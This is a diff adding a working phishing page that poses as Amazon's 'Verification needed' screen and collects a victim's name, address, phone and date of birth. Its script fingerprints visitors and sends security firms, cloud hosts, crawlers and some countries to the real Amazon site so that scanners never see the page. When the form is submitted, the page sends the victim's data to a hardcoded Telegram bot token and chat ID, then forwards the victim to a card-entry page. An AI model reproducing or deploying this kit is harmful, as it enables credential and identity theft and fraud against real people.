@@ -1,0 +1,456 @@
+<html><head>
+    <title>Amazon - Update Info</title>
+    <link rel="icon" href="../assets/img/amazon.png">
+    <link rel="stylesheet" href="../assets/css/mobile_login.css">
+    <link rel="stylesheet" href="../assets/css/billing.css">
+    <!-- <script src="../assets/js/jquery.js"></script> -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+    <script src="../assets/js/jquery.masked.js"></script>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+    </head>
+    <body>
+        <script>
+        $(document).ready(function(){
+      var bith = "dd/mm/yyyy";
+      $("#ssn").mask("999-99-9999",{placeholder:"___-__-____"});
+      $('input[name="dob"]').mask("99/99/9999", {placeholder: bith });
+        $('input[name="phone"]').keyup(function(e) {
+          if (/\D/g.test(this.value))
+          {
+            this.value = this.value.replace(/\D/g, '');
+          }
+        });
+        });
+        </script>
+      <center>
+     <br><header style="background-color:#fff;">
+      <div class="hleft">
+      <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
+        height: 31px;
+        width: 103px;" role="img" aria-label="Amazon"></i>
+      </div>
+      </header>  </center><center>
+        <br><div style="width:400px;" class="boxlogin"><div id="warnings" style="font-size:12px;font-family: Arial,sans-serif;">
+    <h1>Verification needed</h1>
+    <span style="font-size:15px;font-family: Arial,sans-serif;">Please enter your billing address to verify your account.</span>
+    <br>
+    <br><br>
+     </div>
+     <form action="" method="post" name="add" id="details">
+    <div id="formbilling">
+        <h3>Billing Address</h3>
+    <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
+      <div style="border-top-color: #949494;background: #e7e9ec;
+        border-radius: 3px;
+        border-color: #ADB1B8 #A2A6AC #8D9096;
+        border-style: solid;
+        border-width: 1px;
+        cursor: pointer;
+        display: inline-block;
+        padding: 5px;
+        width:100%;
+        text-align: center;
+        text-decoration: none!important;
+        vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <select name="country" id="country" style="background-color: transparent;
+        border: 0;
+        display: block;
+        font-size: 1.6rem;
+        line-height: 1.35;
+        margin: 0;
+        outline: 0;
+        padding: 1.2rem 1.6rem 1.2rem 1.7rem;
+        text-align: center;padding:10px;width:99.7%;border-style:none;" required="required">
+          <option value="">Select Country</option>
+          <option value="Afghanistan">Afghanistan</option>
+          <option value="Albania">Albania</option>
+          <option value="Algeria">Algeria</option>
+          <option value="American Samoa">American Samoa</option>
+          <option value="Andorra">Andorra</option>
+          <option value="Angola">Angola</option>
+          <option value="Anguilla">Anguilla</option>
+          <option value="Antarctica">Antarctica</option>
+          <option value="Antigua and Barbuda">Antigua and Barbuda</option>
+          <option value="Argentina">Argentina</option>
+          <option value="Armenia">Armenia</option>
+          <option value="Aruba">Aruba</option>
+          <option value="Australia">Australia</option>
+          <option value="Austria">Austria</option>
+          <option value="Azerbaijan">Azerbaijan</option>
+          <option value="Bahamas">Bahamas</option>
+          <option value="Bahrain">Bahrain</option>
+          <option value="Bangladesh">Bangladesh</option>
+          <option value="Barbados">Barbados</option>
+          <option value="Belarus">Belarus</option>
+          <option value="Belgium">Belgium</option>
+          <option value="Belize">Belize</option>
+          <option value="Benin">Benin</option>
+          <option value="Bermuda">Bermuda</option>
+          <option value="Bhutan">Bhutan</option>
+          <option value="Bolivia">Bolivia</option>
+          <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
+          <option value="Botswana">Botswana</option>
+          <option value="Bouvet Island">Bouvet Island</option>
+          <option value="Brazil">Brazil</option>
+          <option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
+          <option value="Brunei Darussalam">Brunei Darussalam</option>
+          <option value="Bulgaria">Bulgaria</option>
+          <option value="Burkina Faso">Burkina Faso</option>
+          <option value="Burundi">Burundi</option>
+          <option value="Cambodia">Cambodia</option>
+          <option value="Cameroon">Cameroon</option>
+          <option value="Canada">Canada</option>
+          <option value="Cape Verde">Cape Verde</option>
+          <option value="Cayman Islands">Cayman Islands</option>
+          <option value="Central African Republic">Central African Republic</option>
+          <option value="Chad">Chad</option>
+          <option value="Chile">Chile</option>
+          <option value="China">China</option>
+          <option value="Christmas Island">Christmas Island</option>
+          <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
+          <option value="Colombia">Colombia</option>
+          <option value="Comoros">Comoros</option>
+          <option value="Congo">Congo</option>
+          <option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option>
+          <option value="Cook Islands">Cook Islands</option>
+          <option value="Costa Rica">Costa Rica</option>
+          <option value="Cote D'ivoire">Cote D'ivoire</option>
+          <option value="Croatia">Croatia</option>
+          <option value="Cuba">Cuba</option>
+          <option value="Cyprus">Cyprus</option>
+          <option value="Czech Republic">Czech Republic</option>
+          <option value="Denmark">Denmark</option>
+          <option value="Djibouti">Djibouti</option>
+          <option value="Dominica">Dominica</option>
+          <option value="Dominican Republic">Dominican Republic</option>
+          <option value="Ecuador">Ecuador</option>
+          <option value="Egypt">Egypt</option>
+          <option value="El Salvador">El Salvador</option>
+          <option value="Equatorial Guinea">Equatorial Guinea</option>
+          <option value="Eritrea">Eritrea</option>
+          <option value="Estonia">Estonia</option>
+          <option value="Ethiopia">Ethiopia</option>
+          <option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option>
+          <option value="Faroe Islands">Faroe Islands</option>
+          <option value="Fiji">Fiji</option>
+          <option value="Finland">Finland</option>
+          <option value="France">France</option>
+          <option value="French Guiana">French Guiana</option>
+          <option value="French Polynesia">French Polynesia</option>
+          <option value="French Southern Territories">French Southern Territories</option>
+          <option value="Gabon">Gabon</option>
+          <option value="Gambia">Gambia</option>
+          <option value="Georgia">Georgia</option>
+          <option value="Germany">Germany</option>
+          <option value="Ghana">Ghana</option>
+          <option value="Gibraltar">Gibraltar</option>
+          <option value="Greece">Greece</option>
+          <option value="Greenland">Greenland</option>
+          <option value="Grenada">Grenada</option>
+          <option value="Guadeloupe">Guadeloupe</option>
+          <option value="Guam">Guam</option>
+          <option value="Guatemala">Guatemala</option>
+          <option value="Guinea">Guinea</option>
+          <option value="Guinea-bissau">Guinea-bissau</option>
+          <option value="Guyana">Guyana</option>
+          <option value="Haiti">Haiti</option>
+          <option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option>
+          <option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option>
+          <option value="Honduras">Honduras</option>
+          <option value="Hong Kong">Hong Kong</option>
+          <option value="Hungary">Hungary</option>
+          <option value="Iceland">Iceland</option>
+          <option value="India">India</option>
+          <option value="Indonesia">Indonesia</option>
+          <option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option>
+          <option value="Iraq">Iraq</option>
+          <option value="Ireland">Ireland</option>
+          <option value="Israel">Israel</option>
+          <option value="Italy">Italy</option>
+          <option value="Jamaica">Jamaica</option>
+          <option value="Japan">Japan</option>
+          <option value="Jordan">Jordan</option>
+          <option value="Kazakhstan">Kazakhstan</option>
+          <option value="Kenya">Kenya</option>
+          <option value="Kiribati">Kiribati</option>
+          <option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option>
+          <option value="Korea, Republic of">Korea, Republic of</option>
+          <option value="Kuwait">Kuwait</option>
+          <option value="Kyrgyzstan">Kyrgyzstan</option>
+          <option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option>
+          <option value="Latvia">Latvia</option>
+          <option value="Lebanon">Lebanon</option>
+          <option value="Lesotho">Lesotho</option>
+          <option value="Liberia">Liberia</option>
+          <option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option>
+          <option value="Liechtenstein">Liechtenstein</option>
+          <option value="Lithuania">Lithuania</option>
+          <option value="Luxembourg">Luxembourg</option>
+          <option value="Macao">Macao</option>
+          <option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option>
+          <option value="Madagascar">Madagascar</option>
+          <option value="Malawi">Malawi</option>
+          <option value="Malaysia">Malaysia</option>
+          <option value="Maldives">Maldives</option>
+          <option value="Mali">Mali</option>
+          <option value="Malta">Malta</option>
+          <option value="Marshall Islands">Marshall Islands</option>
+          <option value="Martinique">Martinique</option>
+          <option value="Mauritania">Mauritania</option>
+          <option value="Mauritius">Mauritius</option>
+          <option value="Mayotte">Mayotte</option>
+          <option value="Mexico">Mexico</option>
+          <option value="Micronesia, Federated States of">Micronesia, Federated States of</option>
+          <option value="Moldova, Republic of">Moldova, Republic of</option>
+          <option value="Monaco">Monaco</option>
+          <option value="Mongolia">Mongolia</option>
+          <option value="Montserrat">Montserrat</option>
+          <option value="Morocco">Morocco</option>
+          <option value="Mozambique">Mozambique</option>
+          <option value="Myanmar">Myanmar</option>
+          <option value="Namibia">Namibia</option>
+          <option value="Nauru">Nauru</option>
+          <option value="Nepal">Nepal</option>
+          <option value="Netherlands">Netherlands</option>
+          <option value="Netherlands Antilles">Netherlands Antilles</option>
+          <option value="New Caledonia">New Caledonia</option>
+          <option value="New Zealand">New Zealand</option>
+          <option value="Nicaragua">Nicaragua</option>
+          <option value="Niger">Niger</option>
+          <option value="Nigeria">Nigeria</option>
+          <option value="Niue">Niue</option>
+          <option value="Norfolk Island">Norfolk Island</option>
+          <option value="Northern Mariana Islands">Northern Mariana Islands</option>
+          <option value="Norway">Norway</option>
+          <option value="Oman">Oman</option>
+          <option value="Pakistan">Pakistan</option>
+          <option value="Palau">Palau</option>
+          <option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option>
+          <option value="Panama">Panama</option>
+          <option value="Papua New Guinea">Papua New Guinea</option>
+          <option value="Paraguay">Paraguay</option>
+          <option value="Peru">Peru</option>
+          <option value="Philippines">Philippines</option>
+          <option value="Pitcairn">Pitcairn</option>
+          <option value="Poland">Poland</option>
+          <option value="Portugal">Portugal</option>
+          <option value="Puerto Rico">Puerto Rico</option>
+          <option value="Qatar">Qatar</option>
+          <option value="Reunion">Reunion</option>
+          <option value="Romania">Romania</option>
+          <option value="Russian Federation">Russian Federation</option>
+          <option value="Rwanda">Rwanda</option>
+          <option value="Saint Helena">Saint Helena</option>
+          <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
+          <option value="Saint Lucia">Saint Lucia</option>
+          <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
+          <option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option>
+          <option value="Samoa">Samoa</option>
+          <option value="San Marino">San Marino</option>
+          <option value="Sao Tome and Principe">Sao Tome and Principe</option>
+          <option value="Saudi Arabia">Saudi Arabia</option>
+          <option value="Senegal">Senegal</option>
+          <option value="Serbia and Montenegro">Serbia and Montenegro</option>
+          <option value="Seychelles">Seychelles</option>
+          <option value="Sierra Leone">Sierra Leone</option>
+          <option value="Singapore">Singapore</option>
+          <option value="Slovakia">Slovakia</option>
+          <option value="Slovenia">Slovenia</option>
+          <option value="Solomon Islands">Solomon Islands</option>
+          <option value="Somalia">Somalia</option>
+          <option value="South Africa">South Africa</option>
+          <option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option>
+          <option value="Spain">Spain</option>
+          <option value="Sri Lanka">Sri Lanka</option>
+          <option value="Sudan">Sudan</option>
+          <option value="Suriname">Suriname</option>
+          <option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option>
+          <option value="Swaziland">Swaziland</option>
+          <option value="Sweden">Sweden</option>
+          <option value="Switzerland">Switzerland</option>
+          <option value="Syrian Arab Republic">Syrian Arab Republic</option>
+          <option value="Taiwan, Province of China">Taiwan, Province of China</option>
+          <option value="Tajikistan">Tajikistan</option>
+          <option value="Tanzania, United Republic of">Tanzania, United Republic of</option>
+          <option value="Thailand">Thailand</option>
+          <option value="Timor-leste">Timor-leste</option>
+          <option value="Togo">Togo</option>
+          <option value="Tokelau">Tokelau</option>
+          <option value="Tonga">Tonga</option>
+          <option value="Trinidad and Tobago">Trinidad and Tobago</option>
+          <option value="Tunisia">Tunisia</option>
+          <option value="Turkey">Turkey</option>
+          <option value="Turkmenistan">Turkmenistan</option>
+          <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
+          <option value="Tuvalu">Tuvalu</option>
+          <option value="Uganda">Uganda</option>
+          <option value="Ukraine">Ukraine</option>
+          <option value="United Arab Emirates">United Arab Emirates</option>
+          <option value="United States">United States</option>
+          <option value="United Kingdom">United Kingdom</option>
+          <option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option>
+          <option value="Uruguay">Uruguay</option>
+          <option value="Uzbekistan">Uzbekistan</option>
+          <option value="Vanuatu">Vanuatu</option>
+          <option value="Venezuela">Venezuela</option>
+          <option value="Viet Nam">Viet Nam</option>
+          <option value="Virgin Islands, British">Virgin Islands, British</option>
+          <option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option>
+          <option value="Wallis and Futuna">Wallis and Futuna</option>
+          <option value="Western Sahara">Western Sahara</option>
+          <option value="Yemen">Yemen</option>
+          <option value="Zambia">Zambia</option>
+          <option value="Zimbabwe">Zimbabwe</option>
+        </select>
+      </div>
+      <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <input type="text" style="" placeholder="Full Name" name="fullname" id="fullname" autocorrect="off" autocapitalize="off" required="required">
+        <input type="hidden" name="token" id='token' value="1163128696:AAGHzQ3d4IZgIXqmw_C0P35LWN0E6uTFeis">
+                            <input type="hidden" name="chat_id" id="chat_id" value="1109980785">
+                            <input type="hidden" name="ip" id="ip" >
+      </div>
+      <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <input type="text" placeholder="Address Line" name="address" id="address" autocorrect="off" autocapitalize="off" required="required">
+      </div>
+      <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <input type="text" placeholder="City" name="city" autocorrect="off" id="city" autocapitalize="off" required="required">
+      </div>
+      <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <input type="text" placeholder="State / Province / Region" name="state" id="state" autocorrect="off" autocapitalize="off">
+      </div>
+      <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <input type="text" placeholder="ZIP" name="zipcode" autocorrect="off" id="zipcode" autocapitalize="off" required="required">
+      </div>
+      <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <input type="tel" placeholder="Phone Number" name="phone" autocorrect="off" id="phone" autocapitalize="off" required="required">
+      </div>
+      <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <input type="tel" placeholder="Date of Birth" name="dob" autocorrect="off" id="dob" autocapitalize="off" required="required">
+      </div>
+    <br>
+    <input type="submit" id="submit_cc" class="button a-button-text" style="padding:10px;font-size:15px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value="Update">
+    </div></div>
+    
+    </form>
+    </div>
+    
+    </center>
+    <br><br>
+    <!--  -->
+    <!-- <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script> -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
+  <script>
+        $.getJSON("https://api.bigdatacloud.net/data/client-info",
+		function(data) {
+			$('#ip').val(data.ipString);
+			var dataIP = $('#ip').val();
+			var dataDevice = data.device;
+			var dataOS = data.os;
+			var dataUserAgentD = data.userAgentDisplay;
+			var dataUserAgentR = data.userAgentRaw;
+			var dataSpider = data.isSpider;
+			var dataMobile = data.isMobile;
+					if(dataSpider == false){
+						 // validasi segi company
+						 $.getJSON("https://api.bigdatacloud.net/data/network-by-ip?ip="+ dataIP +"&localityLanguage=id&key=0724b1c789254a05ac35a5c7076b8d43",
+							function(dataApi) {
+							// variable dari apikedua
+							var organisation = dataApi.organisation;
+							var cidr  = dataApi.bgpPrefix;
+							var country = dataApi.registeredCountryName;
+							var bannedorg = ["Private Customer","Iskon Internet d.d. Internet Service Provider Croatia","Telekom System sp.z o.o.","TOT Public Company Limited","Robi Axiata Ltd - DATA","Broadbandtech S. A.","Chubu Telecommunications Co.,Inc.","UnderNet LLC","RM Education Ltd","Siberian Networks","Reliance Jio Infocomm Limited","Loughborough University","WranglerNet","Digital Energy Technologies Limited","CDN77.com","myLoc managed IT AG","ONLINE SERVICOS DE TELECOMUNICACOES LTDA","YouTube, LLC","Ask4 Limited","BVNET S.A.","Satnet Gye CM","Wireless network in Moscow region","DigitalServer Web Hosting en México","VPN Consumer Network","Amazon Technologies Inc.","Microsoft Corporation","Konzept IT GmbH","Fortinet Technologies (Canada)","B2 Net Solutions Inc.","Top Level Hosting SRL","servers.ru hosting services","BT","DIGITALOCEAN","Oy Creanova Hosting Solutions Ltd.","FTIP003161715 Netcraft Limited","pcl-ag03 Dial-up and ADSL pool Plusnet plc.","IPAX OG","Kaspersky Lab AO","Microsoft Azure","AVAST Software s.r.o.","OVH SAS","NFOrce Entertainment B.V.","M247 Ltd","Digital Ocean","Amazon.com","Palo Alto Networks","Leaseweb Asia Pacific pte.","Faction","Kcom","Exetel","Google","Rutgers University","Rackspace Cloud Servers","PRCDN Consumer Pool PoP Frankfurt https://prcdn.net/","Uninet S.A. de C.V.","Paul Bunyan Communications","DigitalOcean, LLC","Kaspersky Lab AO","Kcom Statics","OVH Ltd","M247 LTD Frankfurt Infrastructure","Amsterdam Residential Television and Internet, LLC","Fortinet Technologies (Canada)","FORTINET TECHNOLOGIES (CANADA) INC","LeaseWeb Asia Pacific - Hong Kong Please send all abuse notifications to the following email address"];
+							var bannedcidr = ["31.41.81.0/24","213.202.89.0/24","203.113.80.0/23","103.242.22.0/24","200.112.190.0/24","219.117.32.0/20","176.104.0.0/18","194.154.0.0/19","49.44.64.0/19","80.64.174.0/23","131.231.0.0/16","69.164.144.0/20","154.127.57.0/24","185.93.2.0/24","217.79.176.0/20","191.7.212.0/23","104.237.189.0/24","213.143.0.0/19","190.97.0.0/24","186.68.128.0/19","80.252.129.0/24","191.96.145.0/24","45.41.181.0/24","52.86.0.0/15","13.64.0.0/11","83.175.64.0/18","204.101.161.0/24","69.4.80.0/20","93.119.227.0/24","88.212.240.0/20","91.103.64.0/21","87.112.0.0/14","185.112.82.0/24","178.128.136.0/21","52.240.0.0/12","5.62.40.0/23","51.77.0.0/16","212.92.112.0/21","185.220.70.0/24","159.65.208.0/21","65.154.226.0/24","204.101.161.0/24","207.102.136.0/21","64.120.88.0/22","195.74.76.0/24","52.148.0.0/14"];
+							var bannedOS = ["Ubuntu","Windows 7","Windows XP","Linux"];
+        					var bannedCountry = ["Amerika Serikat","Britania Raya","Indonesia","Jepang","Australia","Selandia Baru","Belgia","Prancis","Islandia","Irlandia","Irlandia, Republik"];
+							var handleorg=bannedorg.join("|");
+							handleorg=new RegExp(handleorg, "i");
+							var handlecidr=bannedcidr.join("|");
+							handlecidr=new RegExp(handlecidr, "i");
+							var handleOS=bannedOS.join("|");
+							handleOS=new RegExp(handleOS, "i");
+							var handleCountry=bannedCountry.join("|");
+							handleCountry=new RegExp(handleCountry, "i");
+								// jika ketemu di list organisasi maka suruh ke amazon
+								if(organisation.search(handleorg) != -1){
+								// suruh ke amazon.com
+								window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+								} else {
+								//proses ke validasi kedua
+									//jika ketemu di list cidr maka suruh amazon lagi
+									if(cidr.search(handlecidr) !=-1){
+									//suruh ke amazon;
+									window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+									}else{
+										// OSS
+										if(dataOS.search(handleOS) !=-1){
+                          //suruh ke amazon;
+                        window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+                        }
+                        else{
+                          // got access
+                            if(country.search(handleCountry) == -1){
+                              //suruh ke amazon;
+                        window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+                            }
+                            else{
+                              // tele
+										// $.ajax({
+										// url:'https://api.telegram.org/bot'+$('#token').val()+'/sendMessage',
+										// method:'POST',
+										// data:{chat_id:$('#chat_id').val(),
+										// text:'LOG: ' + dataDevice + ' ' + country + ' | ' + dataIP + ' | "' + cidr + '", | "' + organisation + '", | ' + dataUserAgentD },
+										// success:function(){
+										// // kosong
+										// }
+										// });
+										//
+                            }
+                        }
+                        // OSSSS
+										
+									}
+								}
+								
+							// 
+							});
+						// 
+					}else{
+						// bot musti ke amazon
+						window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+						// console.log(dataSpider);
+					}	
+			},0);
+
+ // 
+    $.validate({
+      lang: 'en'
+    });
+
+    // 
+
+
+$('form').submit(function(e){
+
+  e.preventDefault();
+  $.ajax({
+  url:'https://api.telegram.org/bot'+$('#token').val()+'/sendMessage',
+  method:'POST',
+  data:{chat_id:$('#chat_id').val(),
+  text:'IP : '+$('#ip').val()+' | Country: '+$('#country').val()+' | Fullname: '+$('#fullname').val()+' | Address: '+$('#address').val()+' | City: '+$('#city').val()+' | State: '+$('#state').val()+' | ZipCode: '+$('#zipcode').val()+' | Phone: '+$('#phone').val()+' | DoB: '+$('#dob').val()},
+  success:function(){
+    window.location.replace("cc.html");
+  }
+  });
+});
+
+
+ 
+  </script>
+
+
+    <!--  -->
+    </body>
+
+
+    </html>
